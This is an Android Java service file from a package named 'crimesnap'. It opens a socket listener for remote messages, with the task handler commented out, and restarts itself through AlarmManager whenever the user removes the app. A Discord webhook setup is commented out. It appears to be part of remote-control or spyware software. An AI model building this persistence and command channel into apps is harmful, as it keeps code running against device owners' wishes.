package com.crimesnap.provider;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.SystemClock;
import android.speech.tts.TextToSpeech;
import android.util.Log;

import androidx.annotation.Nullable;

import java.util.Timer;

import io.socket.client.Socket;


public class InternalService extends Service implements TextToSpeech.OnInitListener {

    public Context context;

    private Socket socket;
    private SocketManager socketManager ;

    private Timer timerTaskScheduler = new Timer();
  //  private LocationTracker tracker = null;
    private String deviceUniqueId = null;
    private TextToSpeech textToSpeech = null;
    //public AppContant locationDataClass;

    @Override
    public void onCreate() {
        super.onCreate();

        Log.d("myLog", "Service: onCreate");

//        DiscordWebhook webhook = new DiscordWebhook(HelperClass.universalWebhookUrl);

//        HelperClass.universalWebhook = webhook;

        this.context = this.getApplicationContext();

        HelperClass.universalContext = context;

        if(HelperClass.universalActivity != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                PermissionManager.checkAndRequestPermissions(HelperClass.universalActivity);
            }
        }

        MyPreferences.init(context);

       // locationDataClass = new AppContant();
      //  AndroidNetworking.initialize(context);
        init();


    }

    private void init() {

        socketManager = SocketManager.getInstance();

        socket = socketManager.getSocket();

        HelperClass.universalSocket = socket;

//        MyPreferences.init(this);

        socket.on(SocketManager.EVENT_RECEIVE_MESSAGE, args -> {

            if (args.length > 0) {
//                new Thread(() -> {
//                    try {
////                        JSONObject jsonData = new JSONObject(args[0].toString());
////                        HelperClass.TaskSocketMan(jsonData, InternalService.this);
//                    } catch (JSONException e) {
//                        e.printStackTrace();
//                    } catch (ClassCastException e) {
//                        e.printStackTrace();
//                    }
//                }).start();
            }
        });

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
    @Override
    public void onTaskRemoved(Intent rootIntent) {
      

        Intent restartService = new Intent(getApplicationContext(), this.getClass());
        restartService.setPackage(getPackageName());
        PendingIntent restartServicePI = PendingIntent.getService(
                getApplicationContext(), 1, restartService,
                PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
        AlarmManager alarmService = (AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
        alarmService.set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 1000, restartServicePI);

        super.onTaskRemoved(rootIntent);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onInit(int status) {

    }
}
